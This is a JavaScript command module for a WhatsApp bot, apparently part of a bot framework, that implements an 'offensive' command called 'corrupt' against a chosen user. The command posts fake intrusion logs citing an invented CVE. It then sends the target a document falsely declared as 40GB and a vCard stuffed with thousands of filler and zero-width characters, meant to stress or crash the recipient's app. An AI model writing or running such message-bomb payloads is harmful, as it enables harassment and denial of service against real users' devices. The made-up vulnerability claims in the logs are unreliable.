const { log } = require('../utils/logger');

module.exports = {
    name: 'corrupt',
    description: '🧊 Metadata Disruption: Sends malicious/glitched files to the target to simulate data corruption.',
    category: 'offensive',
    isAdmin: true,
    isOwner: true,
    async execute({ sock, chatId, message, args, bot }) {
        try {
            const target = message.message?.extendedTextMessage?.contextInfo?.participant ||
                (args[0] ? args[0].replace('@', '') + '@s.whatsapp.net' : chatId);

            const number = target.split('@')[0];
            const corruptionLogs = [
                `🧊 *INITIATING METADATA DISRUPTION* on @${number}...`,
                `🔓 *VULNERABILITY:* Protocol_Header_Leak (CVE-2024-X)`,
                `💉 *INJECTING CORRUPT BINARY:* [0x${Math.random().toString(16).slice(2, 8).toUpperCase()}]`,
                `⚠️ *INTEGRITY_CHECK:* FAILED. Stanza headers parity mismatch.`
            ];

            for (const logText of corruptionLogs) {
                await sock.sendMessage(chatId, { text: logText, mentions: [target] });
                await delay(800);
            }

            // Sending a malformed document with simulated corruption
            await sock.sendMessage(target, {
                document: Buffer.alloc(1024, 'ABYSSFLOW_CORRUPTION_PAYLOAD'),
                fileName: "☢️ emergency_kernel_dump.bin",
                mimetype: "application/x-abyss-corrupt",
                fileLength: 42949672960, // 40GB fake size to stress UI
                caption: `🚨 *SYSTEM_INTEGRITY_FAILURE*\n\nLe noyau du système a été exposé à une injection de données non autorisée.\nCorruption: 100%\nID: ${Math.random().toString(36).substr(2, 9).toUpperCase()}`
            });

            // Sending a "Protocol-Killer" VCard
            const vCard = 'BEGIN:VCARD\n' +
                'VERSION:3.0\n' +
                'FN:☠️ AUDITOR_CORRUPTION_NODE\n' +
                'TEL;type=CELL;type=VOICE;waid=0:0\n' +
                'ADR:;;' + "▓".repeat(2000) + ';;;;\n' +
                'NOTE:' + "\u200B".repeat(5000) + '\n' +
                'END:VCARD';

            await sock.sendMessage(target, {
                contacts: {
                    displayName: "☣️ PROTOCOL_NULL_POINTER",
                    contacts: [{ vcard: vCard }]
                }
            });

        } catch (error) {
            log.error('Error in CORRUPT command:', error);
            await sock.sendMessage(chatId, { text: '❌ Échec de la corruption.' });
        }
    }
};
